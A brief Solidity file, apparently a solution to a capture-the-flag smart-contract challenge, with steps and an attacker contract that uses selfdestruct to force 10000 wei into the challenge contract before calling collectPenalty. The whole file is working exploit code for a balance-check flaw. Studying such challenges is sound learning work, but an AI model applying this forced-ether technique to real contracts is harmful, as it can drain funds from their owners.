// Challenge contract deployed at address: 0x3b2900ff9b061Fa5d1Ce5298B4C74088EBdAbCA5
// 1 - Deploy the RetirementFundChallengeAttacker contract with 10000 wei. Sends 10000 wei to the
// challenge contract
// 2 - Call the collectPenalty function

pragma solidity ^0.4.21;

contract RetirementFundChallengeAttacker {
    function RetirementFundChallengeAttacker(address challenge) public payable {
        selfdestruct(challenge);
    }
}
